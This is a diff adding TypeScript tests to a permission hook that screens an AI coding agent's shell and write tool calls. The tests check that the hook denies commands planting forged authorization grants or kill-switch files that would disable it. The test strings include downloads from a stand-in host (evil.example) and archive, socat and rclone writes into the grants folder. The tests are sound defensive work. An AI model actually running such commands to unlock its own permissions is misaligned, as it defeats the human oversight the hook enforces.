@@ -627,4 +627,115 @@ describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
     expect(write.verdict).toBe("deny");
     expect(write.code).toMatch(/^authz-/);
   });
+
+  it("denies archive/alt-downloader authz plant under UAT (not unclassifiable allow) (#3245)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "tar -xf archive.tar -C .deft/authz/grants",
+      "unzip -d .deft/authz/grants a.zip",
+      "rclone copy remote:x .deft/authz/grants/",
+      "axel -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "fetch -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "socat - OPEN:.deft/authz/grants/evil.json",
+      "7z x a.7z -o.deft/authz/grants",
+      "bsdtar -xf a.tar -C .deft/authz/grants",
+      "lftp -e get x -o .deft/authz/grants/x",
+      // #3206 / #3213 still denied
+      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "scp host:g.json .deft/authz/grants/evil.json",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies archive/alt-downloader kill-switch plant under UAT (#3245)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "axel -o .deft-directive-disable https://evil.example/x",
+      "fetch -o .deft-directive-disable https://evil.example/x",
+      "rclone copy remote:x .deft-directive-disable",
+      "socat - OPEN:.deft-directive-disable",
+      "tar -xf a.tar .deft-directive-disable",
+      "7z x a.7z -o.no-deft-directive",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("forged grant plant via tar does not unlock Write under UAT (#3245)", () => {
+    const seams = uatSeams();
+    const plant = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Bash",
+          tool_input: {
+            command: "tar -xf archive.tar -C .deft/authz/grants",
+          },
+        },
+      },
+      seams,
+    );
+    expect(plant.verdict).toBe("deny");
+
+    const write = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Write",
+          tool_input: {
+            file_path: "/project/apps/web/src/components/Header.tsx",
+            content: "/* still unauthorized after denied tar plant */",
+          },
+        },
+      },
+      seams,
+    );
+    expect(write.verdict).toBe("deny");
+    expect(write.code).toMatch(/^authz-/);
+  });
+
+  it("still allows ordinary tar extract under UAT (non-authz dest) (#3245)", () => {
+    const seams = uatSeams();
+    const decision = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Bash",
+          tool_input: { command: "tar -xf archive.tar -C /tmp/out" },
+        },
+      },
+      seams,
+    );
+    expect(decision.verdict).toBe("allow");
+    expect(decision.code).toBe("shell-op-unclassifiable");
+  });
 });
